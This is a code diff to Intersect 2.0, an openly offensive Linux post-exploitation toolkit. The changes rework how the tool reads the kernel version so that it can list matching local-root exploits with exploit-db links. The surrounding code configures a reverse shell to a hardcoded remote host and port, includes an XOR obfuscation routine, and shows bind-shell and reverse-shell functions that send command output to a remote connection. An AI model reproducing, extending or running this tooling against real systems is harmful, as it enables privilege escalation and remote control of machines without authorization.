@@ -3,7 +3,7 @@
 # copyright 2012
 # email: bindshell[at]live[dot]com
 # twitter: @ohdae
-# http://github.com/ohdae/Intersect-2.0/ || http://bindshell.it.cx/intersect.html
+# http://github.com/ohdae/Intersect-2.0/ || http://bindshell.it.cx/
 #
 # To see the full description of Intersect 2.0, view the attached ReadMe file.
 # The ToDo-List will be updated frequently to show changes, upcoming features, bug fixes, etc.
@@ -86,38 +86,33 @@ def usage():
 def environment():
    global Home_Dir
    global Temp_Dir
-   global kernel
-   global distro
+   global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
-   global Config_Dir
    global RHOST
    global RPORT
-   global distro2
    global pkey
+   global distro
+   global distro2
+   global kernel_version_string
 
    # Change RHOST & RPORT accordingly if you're going to use the reverse shell   
    RHOST = '192.168.1.19'
    RPORT = 443
    pkey = 'XKIUKX'
 
-   fullkernel = os.uname()[2]
-   splitkern = fullkernel.split("-")
-   kernel = splitkern[0]
+   kernel_version_string = os.popen('uname -r').read().strip()
    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
-   arch = os.uname()[4]
  
    if os.geteuid() != 0:
         print("[*] This script *must* be executed as root. If not, there will be errors and/or crashes.")
         print("[*] Intersect will now check this kernel for possible privilege escalation exploits.\n     We will find your kernel version and display a list of exploits for that kernel, if available.")
         exploitCheck()
-        print("[+] The exploits above *might* allow you to gain root access.")
-        print("[+] Intersect cannot be executed as a non-root user. Please run again while root.")
         sys.exit()
    else:
         pass
@@ -150,6 +145,7 @@ def environment():
 
    print "[!] Reports will be saved in: %s" % Temp_Dir
 
+
 def xor(string, key):
     data = ''
     for char in string:
@@ -157,6 +153,7 @@ def xor(string, key):
             char = chr(ord(char) ^ ord(ch))
         data += char
     return data
+
   
 def signalHandler(signal, frame):
   print("[!] Ctrl-C caught, shutting down now");
@@ -578,6 +575,16 @@ def writeNewFile(filePath, fileContents):
   f.close()
   
 
+def fix_version(version):
+    split_version = version.split(".")
+
+    if len(split_version) >= 3 and len(split_version[2]) == 1:
+        split_version[2] = "0%s" % split_version[2]
+        version = ".".join(v for v in split_version)
+
+    return version
+
+
 def exploitCheck():
     # Shout out to Bernardo Damele for letting me use this code! Thanks again!
     # Check out his blog at http://bernardodamele.blogspot.com
@@ -585,7 +592,10 @@ def exploitCheck():
     exploitdb_url = "http://www.exploit-db.com/exploits"
     enlightenment_url = "http://www.grsecurity.net/~spender/enlightenment.tgz"
     
-    print "[+] Results for local kernel version %s" % kernel
+    print "[+] Results for local kernel version %s" % kernel_version_string
+
+    kernel_parts = kernel_version_string.split("-")
+    kernel_version = fix_version(kernel_parts[0])
 
     found_exploit = False
     exploits = {
@@ -636,13 +646,19 @@ def exploitCheck():
             else:
                 min_version, max_version = version_tree, version_tree
 
-            if kernel >= min_version and kernel <= max_version:
+            if kernel_version >= min_version and kernel_version <= max_version:
                 cve = data["CVE"]
                 exploits = data["exploits"]
                 found_exploit = True
 
                 print "\n* Linux Kernel %s Local Root Exploit\n    CVE: CVE-%s\n    Affected Kernels: %s-%s\n    Exploits:\n%s" % (name, cve, min_version, max_version, "\n".join("      %s/%d" % (exploitdb_url, expl) if isinstance(expl, int) else "      %s" % expl for expl in exploits))
 
+    if found_exploit:
+        print
+
+        if len(kernel_parts) > 1:
+            print "WARNING: %s appears to be a modified version of kernel %s." % (kernel_version_string, kernel_version)
+            print "These exploits can *possibly* get you to uid=0, but this script does *not* consider patched or backported kernel version\n"
 
 
 def bindShell():
@@ -893,7 +909,6 @@ def reverseShell():
         elif proc:
             conn.sendall( stdout )
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ") 
-
 
 
 def MakeArchive():
